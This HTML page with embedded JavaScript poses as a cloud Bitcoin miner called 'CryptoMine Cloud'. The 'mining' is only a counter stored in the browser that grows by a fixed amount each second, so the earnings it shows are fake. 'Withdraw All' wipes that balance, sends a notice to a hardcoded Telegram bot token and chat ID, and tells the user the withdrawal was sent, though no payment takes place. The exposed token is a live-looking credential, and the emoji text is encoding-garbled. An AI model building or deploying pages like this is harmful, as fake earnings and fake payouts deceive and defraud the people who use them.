<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>CryptoMine Cloud - BTC Miner</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #111;
  color: #fff;
}
.app {
  max-width: 420px;
  margin: auto;
  padding: 15px;
}
.header {
  text-align: center;
  margin-bottom: 20px;
}
.header h1 {
  color: #ff9900;
}
.card {
  background: #1c1c1c;
  border-radius: 12px;
  padding: 15px;
  margin-bottom: 15px;
}
.balance {
  font-size: 26px;
  text-align: center;
  color: #ff9900;
}
.euro {
  text-align: center;
  color: #aaa;
  margin-top: 4px;
}
.rate {
  text-align: center;
  color: #aaa;
}
button {
  width: 100%;
  padding: 12px;
  margin-top: 10px;
  border: none;
  border-radius: 8px;
  background: #ff9900;
  color: #000;
  font-size: 16px;
  cursor: pointer;
}
button.secondary {
  background: #333;
  color: #fff;
}
</style>
</head>

<body>

<div class="app">

  <div class="header">
    <h1>CryptoMine Cloud</h1>
    <p>BTC Miner</p>
  </div>

  <div class="card">
    <div class="balance" id="balance">0.00000000 BTC</div>
    <div class="euro" id="euro">â‰ˆ 0.00 â‚¬</div>
    <div class="rate">Mining speed: Fixed</div>
    <button id="mineBtn">â–¶ Start Mining</button>
    <button class="secondary" onclick="withdrawAll()">ðŸ’¸ Withdraw All</button>
  </div>

</div>

<script>
// ===== TELEGRAM CONFIG =====
const BOT_TOKEN = "8206049937:AAEv07GYDOVNBthgFaZi1U1KCvu5gzWPbo4";
const CHAT_ID = "7400979339";

// ===== DATA =====
let balance = parseFloat(localStorage.getItem("btc")) || 0;
let mining = false;
let interval;
let btcPrice = 0;

// vitesse fixe (rapide)
const MINING_SPEED = 0.0000001;

// ===== BTC PRICE =====
async function getBTCPrice() {
  const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=eur");
  const d = await r.json();
  btcPrice = d.bitcoin.eur;
  updateUI();
}
getBTCPrice();
setInterval(getBTCPrice, 60000);

// ===== UI =====
function updateUI() {
  balance = Math.max(balance, 0);
  document.getElementById("balance").innerText = balance.toFixed(8) + " BTC";
  document.getElementById("euro").innerText =
    "â‰ˆ " + (balance * btcPrice).toFixed(2) + " â‚¬";
}

// ===== MINING =====
mineBtn.onclick = () => {
  mining = !mining;
  if (mining) {
    mineBtn.innerText = "â¹ Stop Mining";
    interval = setInterval(() => {
      balance += MINING_SPEED;
      localStorage.setItem("btc", balance);
      updateUI();
    }, 1000);
  } else {
    mineBtn.innerText = "â–¶ Start Mining";
    clearInterval(interval);
  }
};

// ===== WITHDRAW ALL =====
function withdrawAll() {
  if (balance <= 0) {
    alert("No balance to withdraw");
    return;
  }

  const amount = balance;
  balance = 0;
  localStorage.setItem("btc", balance);
  updateUI();

  const msg =
`ðŸ’¸ WITHDRAW ALL REQUEST
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
â‚¿ Amount: ${amount.toFixed(8)} BTC
ðŸ’¶ Value: ${(amount * btcPrice).toFixed(2)} â‚¬
â° ${new Date().toLocaleString()}`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: msg
    })
  });

  alert("Withdraw sent");
}

updateUI();
</script>

</body>
</html>
